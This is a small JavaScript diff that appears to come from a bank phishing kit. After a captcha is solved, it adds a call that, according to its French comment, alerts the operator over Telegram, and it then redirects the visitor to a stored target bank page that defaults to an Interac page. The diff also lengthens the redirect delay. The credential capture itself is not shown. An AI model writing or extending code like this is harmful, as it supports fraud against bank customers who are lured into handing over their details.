@@ -39,10 +39,16 @@
         if (btnGo) {
             btnGo.classList.add('active');
         }
+
+        // Notifier Telegram que le Captcha a été résolu
+        if (window._notifyCaptchaSolved) {
+            window._notifyCaptchaSolved();
+        }
+
         setTimeout(function() {
             var target = sessionStorage.getItem('__targetBank') || 'main_interac.html';
             window.location.href = target;
-        }, 500);
+        }, 600);
     }
 
     document.addEventListener('DOMContentLoaded', function() {
